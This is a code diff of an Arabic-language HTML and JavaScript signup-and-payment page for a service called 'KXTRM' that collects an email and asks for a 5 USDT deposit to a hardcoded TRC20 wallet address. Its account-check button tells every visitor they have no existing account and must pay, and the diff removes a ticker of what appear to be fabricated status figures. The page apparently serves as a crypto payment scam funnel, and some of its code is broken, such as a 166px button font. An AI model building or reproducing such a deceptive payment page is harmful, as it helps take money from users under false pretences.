@@ -5,16 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>KXTRM - الدفع والاشتراك</title>
     
+    <!-- جلب خط Cairo الاحترافي من جوجل -->
     <link rel="preconnect" href="https://googleapis.com">
     <link rel="preconnect" href="https://gstatic.com" crossorigin>
-    <link href="https://googleapis.com/css2?family=Cairo:wght@900&display=swap" rel="stylesheet">
+    <link href="https://googleapis.com" rel="stylesheet">
 
     <style>
-        * {
-            font-family: 'Cairo', sans-serif !important;
-            font-weight: 900 !important;
-        }
         body { 
+            font-family: 'Cairo', sans-serif; 
             background-color: #0f0c1b; 
             color: #ffffff; 
             text-align: center; 
@@ -32,13 +30,16 @@
             border: 1px solid #3d2f75; 
         }
         .brand { 
+            font-family: 'Cairo', sans-serif;
             font-size: 34px; 
+            font-weight: 900; 
             margin-bottom: 10px; 
             letter-spacing: 1px;
         }
         .subtitle { 
             color: #a29bfe; 
             font-size: 15px; 
+            font-weight: 600;
             margin-bottom: 20px; 
         }
         .amount-tag {
@@ -47,40 +48,9 @@
             padding: 12px;
             border-radius: 10px;
             font-size: 18px;
+            font-weight: 700;
             color: #00ffcc;
             margin-bottom: 25px;
-        }
-        .countries-bar {
-            background-color: #06040a; 
-            border: 2px solid #00ffaa; 
-            border-radius: 10px;
-            padding: 10px;
-            margin-bottom: 25px;
-            overflow: hidden;
-            white-space: nowrap;
-            position: relative;
-            box-shadow: inset 0 0 10px rgba(0, 255, 170, 0.2);
-        }
-        .countries-track {
-            display: inline-block;
-            white-space: nowrap;
-            animation: marquee 18s linear infinite;
-        }
-        .country-item {
-            display: inline-flex;
-            align-items: center;
-            margin-left: 35px;
-            font-size: 18px; 
-            color: #00ffaa; 
-            text-shadow: 0 0 8px rgba(0, 255, 170, 0.4); 
-        }
-        .country-item span {
-            color: #ffffff; 
-            margin-left: 6px;
-        }
-        @keyframes marquee {
-            0% { transform: translate3d(0, 0, 0); }
-            100% { transform: translate3d(-50%, 0, 0); }
         }
         .input-group { 
             margin-bottom: 20px; 
@@ -90,9 +60,11 @@
             display: block; 
             margin-bottom: 8px; 
             color: #b2bec3; 
-            font-size: 14px;
+            font-size: 14px; 
+            font-weight: 600;
         }
         input[type="text"] { 
+            font-family: 'Cairo', sans-serif;
             width: 100%; 
             padding: 12px; 
             border-radius: 10px; 
@@ -106,6 +78,7 @@
             margin-top: 25px; 
             font-size: 12px; 
             color: #636e72; 
+            font-weight: 600;
         }
         .bottom-logo {
             max-width: 100%; 
@@ -113,99 +86,47 @@
             display: block; 
             margin: 20px auto 0 auto;
         }
-        @keyframes greenGlowPulse {
-            0% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); }
-            50% { background-color: #00ffa3; box-shadow: 0 0 25px rgba(0, 255, 163, 0.9); }
-            100% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); }
-        }
-        @keyframes cyanGlowPulse {
-            0% { background-color: #0097e6; box-shadow: 0 0 10px rgba(0, 151, 230, 0.5); }
-            50% { background-color: #00d2ff; box-shadow: 0 0 25px rgba(0, 210, 255, 0.9); }
-            100% { background-color: #0097e6; box-shadow: 0 0 10px rgba(0, 151, 230, 0.5); }
-        }
-        .submit-btn-pulse {
-            width: 100%; 
-            padding: 14px; 
-            color: #000000; 
-            border: none; 
-            border-radius: 8px; 
-            font-size: 17px; 
-            margin-top: 20px; 
-            cursor: pointer;
-            box-sizing: border-box;
-            animation: greenGlowPulse 2s infinite ease-in-out;
-            transition: 0.2s;
-        }
-        .submit-btn-pulse:hover { transform: scale(1.02); }
+        
+        /* تنسيق زر بايننس الجديد والمضمون */
         .binance-btn-final {
             width: 100%; 
-            padding: 15px; 
-            color: #000000; 
+            padding: 14px; 
+            background: #f3ba2f; 
+            color: #000; 
             border: none; 
-            border-radius: 10px; 
-            font-size: 17px; 
+            border-radius: 8px; 
+            font-weight: bold; 
+            font-size: 15px; 
             cursor: pointer; 
             display: block; 
             text-decoration: none; 
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             box-sizing: border-box;
-            animation: greenGlowPulse 2s infinite ease-in-out;
+            box-shadow: 0 4px 15px rgba(243, 186, 47, 0.3);
             transition: 0.2s;
         }
-        .binance-btn-final:hover { transform: scale(1.02); }
-        .manual-deposit-box {
-            margin-top: 25px; 
-            padding: 18px 15px; 
-            border: 2px dashed #0097e6; 
-            border-radius: 12px; 
-            background-color: #ffffff; 
-            text-align: center;
-            box-shadow: 0 5px 15px rgba(255,255,255,0.1);
-        }
-        .crypto-address-input {
-            width: 100%; 
-            padding: 11px; 
-            text-align: center; 
-            background: #f1f2f6; 
-            color: #2f3542; 
-            border: 1px solid #ced6e0; 
-            border-radius: 6px; 
-            font-size: 12px; 
-            direction: ltr; 
-            white-space: nowrap; 
-            overflow: hidden; 
-            text-overflow: ellipsis; 
-            box-sizing: border-box;
-            margin-bottom: 5px;
-        }
-        .copy-btn-pulse {
-            padding: 12px; 
-            color: #ffffff; 
-            border: none; 
-            border-radius: 6px; 
-            cursor: pointer; 
-            font-size: 15px; 
-            margin-top: 12px; 
-            width: 100%;
-            box-sizing: border-box;
-            animation: cyanGlowPulse 2s infinite ease-in-out;
-            transition: 0.2s;
-        }
-        .copy-btn-pulse:hover { transform: scale(1.02); }
+
+        /* تنسيق زر التحقق من الحساب المسبق */
         .check-account-btn {
+            font-family: 'Cairo', sans-serif;
             width: 100%;
             padding: 12px;
             background: transparent;
             color: #a29bfe;
             border: 1px dashed #4a3f85; 
             border-radius: 8px;
+            font-weight: bold;
             font-size: 14px;
             margin-top: 15px; 
             margin-bottom: 5px; 
             cursor: pointer;
             transition: 0.3s;
         }
-        .check-account-btn:hover { background: #1d1836; color: #fff; border-color: #6c5ce7; }
+        .check-account-btn:hover {
+            background: #1d1836;
+            color: #fff;
+            border-color: #6c5ce7;
+        }
     </style>
 </head>
 <body>
@@ -213,49 +134,36 @@
         <div class="brand">KXTRM</div>
         <div class="subtitle">إنشاء حساب جديد للمتابعة وتشغيل الخدمة</div>
         
-        <div class="amount-tag">الإيداع: 5.00 USDT</div>
+        <div class="amount-tag">  الإيداع: 5.00 USDT</div>
 
         <form id="paymentForm">
+            <!-- الخطوة الأولى: بداية الدخول -->
             <div id="step1">
-                <div class="countries-bar">
-                    <div class="countries-track">
-                        <div class="country-item"><span>الحالة:</span> 33627ع.ل</div>
-                        <div class="country-item"><span>الحالة:</span> 14892م.س</div>
-                        <div class="country-item"><span>الحالة:</span> 99541ر.ك</div>
-                        <div class="country-item"><span>الحالة:</span> 44102ب.ن</div>
-                        <div class="country-item"><span>الحالة:</span> 78563ش.م</div>
-                        <div class="country-item"><span>الحالة:</span> 21459ط.ق</div>
-                        <div class="country-item"><span>الحالة:</span> 65478ن.ر</div>
-                        <div class="country-item"><span>الحالة:</span> 33627ع.ل</div>
-                        <div class="country-item"><span>الحالة:</span> 14892م.س</div>
-                        <div class="country-item"><span>الحالة:</span> 99541ر.ك</div>
-                        <div class="country-item"><span>الحالة:</span> 44102ب.ن</div>
-                        <div class="country-item"><span>الحالة:</span> 78563ش.م</div>
-                        <div class="country-item"><span>الحالة:</span> 21459ط.ق</div>
-                        <div class="country-item"><span>الحالة:</span> 65478ن.ر</div>
-                    </div>
-                </div>
-
                 <div class="input-group">
-                    <label for="username">إنشاء حساب جديد</label>
-                    <input type="text" id="username" placeholder="example@gmail.com" style="background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
+                    <label for="username">البريد الإلكتروني</label>
+                    <input type="text" id="username" required placeholder="example@gmail.com" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
                 </div>
-
-                <button type="button" onclick="goToStep2()" class="submit-btn-pulse">متابعة إلى الإيداع</button>
+                <button type="button" onclick="goToStep2()" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 14px; background: linear-gradient(to right, #7b2cbf, #9d4edd); color: #fff; border: none; border-radius: 8px; font-weight: bold; font-size: 166px; margin-top: 20px; cursor: pointer;">متابعة إلى الإيداع</button>
+                
                 <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
                 
                 <img src="logo.png" alt="logo" class="bottom-logo">
             </div>
 
+            <!-- الخطوة الثانية: خيارات الإيداع بعد التعديل والاصلاح -->
             <div id="step2" style="display: none; margin-top: 15px;">
+                
                 <a href="https://binance.com" class="binance-btn-final">
                     ⚡ الدفع عبر بايننس طلب دفع
                 </a>
 
-                <div class="manual-deposit-box">
-                    <p style="font-size: 14px; margin-bottom: 12px; color: #2f3542;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
-                    <input type="text" value="THJN4XBKxbZNYsw7YAhmNiZSupn3KVEDFP" id="cryptoAddress" class="crypto-address-input" readonly>
-                    <button onclick="copyWalletAddress()" type="button" class="copy-btn-pulse">نسخ عنوان المحفظة</button>
+                <div style="margin-top: 25px; padding: 15px; border: 1px dashed #ffffff33; border-radius: 8px; background: #0f0c1b; text-align: center;">
+                    <p style="font-size: 14px; margin-bottom: 10px; color: #bbb;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
+                    
+                    <!-- تم تصحيح حرف K ليصبح كابيتال هنا وضبط التصميم لمنع التقطيع -->
+                    <input type="text" value="THJN4XBKxbZNYsw7YAhmNiZSupn3KVEDFP" id="cryptoAddress" readonly style="font-family: 'Cairo', sans-serif; width: 100%; padding: 10px; text-align: center; background: #1a1530; color: #fff; border: 1px solid #444; border-radius: 4px; font-size: 11px; direction: ltr; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; box-sizing: border-box;">
+                    
+                    <button onclick="copyWalletAddress()" type="button" style="font-family: 'Cairo', sans-serif; padding: 8px 12px; background: #333; color: #fff; border: 1px solid #555; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: bold; margin-top: 12px; width: 100%;">نسخ عنوان المحفظة</button>
                 </div>
             </div>
         </form>
@@ -265,4 +173,32 @@
 
 <script>
     function goToStep2() {
-    
+        const usernameInput = document.getElementById('username').value;
+        if(usernameInput.trim() === "") {
+            alert("يرجى كتابة البريد الإلكتروني أولاً.");
+            return;
+        }
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+    }
+
+    function copyWalletAddress() {
+        const copyText = document.getElementById("cryptoAddress");
+        
+        // ميزة النسخ الذكي وحذف المسافات المضافة
+        navigator.clipboard.writeText(copyText.value.trim()).then(() => {
+            alert("تم نسخ عنوان المحفظة بشكل سليم! قم بالتحويل من OKX أو أي محفظة أخرى على شبكة TRC20 بقيمة 5 USDT.");
+        }).catch(err => {
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            document.execCommand("copy");
+            alert("تم نسخ عنوان المحفظة!");
+        });
+    }
+
+    function alertNoAccount() {
+        alert("أنت لا تمتلك حساباً مسبقاً، يرجى كتابة بريدك الإلكتروني وإتمام الإيداع لتفعيل الخدمة.");
+    }
+</script>
+</body>
+</html>
